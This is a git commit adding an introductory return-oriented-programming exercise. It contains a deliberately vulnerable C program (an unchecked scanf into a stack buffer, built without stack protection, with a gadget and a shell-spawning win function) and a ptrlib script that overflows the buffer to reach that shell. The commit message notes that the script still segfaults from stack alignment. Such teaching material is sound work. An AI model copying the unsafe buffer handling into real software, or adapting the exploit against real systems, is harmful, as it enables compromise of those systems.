7bb3d5d2fe4fab948306cd17e05dea172176521c
Tom0427 <82128211+Tom-game-project@users.noreply.github.com>
2025-05-12 08:56:30 +0900

    rop入門用サンプルプログラム、アラインメントの関係でまだsegvする

---
+++ rop_easy.py
@@ -0,0 +1,49 @@
+from ptrlib import *
+
+
+def main():
+    """
+
+```
+<< EOF cat | gcc -no-pie -fno-stack-protector -o easy -x c -
+#include <stdio.h>
+#include <stdlib.h>
+
+__attribute__((naked)) void pop_rdi_ret() {
+    __asm__("pop %rdi; ret");
+}
+
+void win(unsigned int key) {
+    if (key == 0xdeadbeef) {
+        system("/bin/sh");
+    } else {
+        puts("You are not allowed to access this function.\n");
+    }
+}
+
+int main(void) 
+{
+    char buf[30];
+    scanf("%s", buf);
+    puts(buf);
+    return 0;
+}
+// gcc easy.c -fno-stack-protector -no-pie -o easy
+EOF
+```
+    """
+    elf = ELF("./easy")
+    proc = Process("./easy")
+
+    input()
+    payload = b'p' * 8 * 5
+    payload += p64(next(elf.gadget("pop rdi; ret")))
+    payload += p64(0xdeadbeef)
+    payload += p64(elf.symbol("win"))
+    proc.sendline(payload)
+    proc.interactive()
+
+
+if __name__ == "__main__" :
+    main()
+
